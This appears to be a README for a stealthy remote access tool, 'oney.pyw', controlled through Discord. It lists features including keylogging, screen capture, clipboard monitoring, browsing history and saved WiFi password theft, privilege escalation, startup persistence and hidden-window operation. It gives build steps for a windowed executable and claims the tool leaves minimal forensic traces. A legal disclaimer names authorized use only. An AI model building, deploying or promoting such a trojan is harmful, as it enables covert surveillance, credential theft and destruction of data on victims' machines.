https://img.shields.io/badge/python-3.8%252B-blue
https://img.shields.io/badge/platform-windows-lightgrey
[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)

A stealthy, feature-rich remote administration tool controlled entirely through Discord, designed for authorized system administration and security research.

🔥 Features
System Control
Remote command execution (!exec)

File system navigation (!ls, !cd, !download)

Process management (via commands)

Admin privilege escalation (!su)

Surveillance
Live screen capture (!screen)

Keylogging (!log, !stoplog)

Clipboard monitoring (!clipboard)

Browser history extraction (!recent)

System Info
Hardware inventory (CPU/GPU/RAM)

Network reconnaissance (IP/MAC/DNS)

WiFi credential recovery

Persistent access (Startup registration)

Automation

Multi-format deployment (.py/.pyw/.exe)

Stealth operation (Hidden window)

⚙️ Installation
Prerequisites:

Python 3.8+
pip install -r requirements.txt
Configuration:

Replace TOKEN in oney.pyw with your Discord bot token

Set desired command prefix

Deployment Options:

bash
# As Python script
python oney.pyw

# As compiled executable (recommended)
pyinstaller --onefile --windowed oney.pyw
🛡️ Legal Disclaimer
⚠️ This software is intended for authorized:

System administration

Penetration testing

Security research

Educational purposes

You must have explicit permission before deploying this tool on any system. Unauthorized use may violate:

Computer Fraud and Abuse Act (CFAA)

General Data Protection Regulation (GDPR)

Other applicable local/international laws

The developers assume no liability for misuse of this software.

📜 Command Reference
    commands_list = [
        ('!screen', 'Capture and send a screenshot'),
        ('!ip', 'Get the IP address'),
        ('!clipboard', 'Show clipboard content'),
        ('!exec <command>', 'Run a shell command'),
        ('!shutdown', 'Shutdown the computer'),
        ('!bsod', 'Trigger a BSOD (WARNING)'),
        ('!msg <message>', 'Show a Windows message box'),
        ('!url <url>', 'Open a URL in browser'),
        ('!restart', 'Restart the computer'),
        ('!cancelrestart', 'Cancel a scheduled restart'),
        ('!log', 'Start keylogging (sends every 15s)'),
        ('!stoplog', 'Stop keylogging'),
        ('!ls', 'List files in the current directory'),
        ('!cd <path>', 'Change the current directory'),
        ('!rm <filename>', 'Delete a file'),
        ('!rmd <dirname>', 'Delete a directory'),
        ('!download <filename>', 'Download a file'),
        ('!uuid', 'Get the system UUID'),
        ('!mac', 'Get MAC addresses'),
        ('!dns', 'Get DNS server info'),
        ('!wifi', 'Show connected WiFi info'),
        ('!wifi_passwords', 'Show saved WiFi passwords'),
        ('!systeminfo', 'Show system information'),
        ('!cpu', 'Show CPU information'),
        ('!gpu', 'Show GPU information'),
        ('!ram', 'Show RAM information in GB'),
        ('!drives', 'Show drives information in GB'),
        ('!hostname', 'Show the hostname'),
        ('!osinfo', 'Show OS version'),
        ('!user', 'Show current user'),
        ('!recent [browser]', 'Show recently visited websites'),
        ('!su', 'Request administrator privileges')
    ]
🌐 Network Diagram
Diagram
Code






📌 Notes
Uses Discord's encrypted channels for communication

Leaves minimal forensic traces

Auto-removes temp files

Tested on Windows 10/11

📜 License
GNU GPLv3 License - See LICENSE for details.
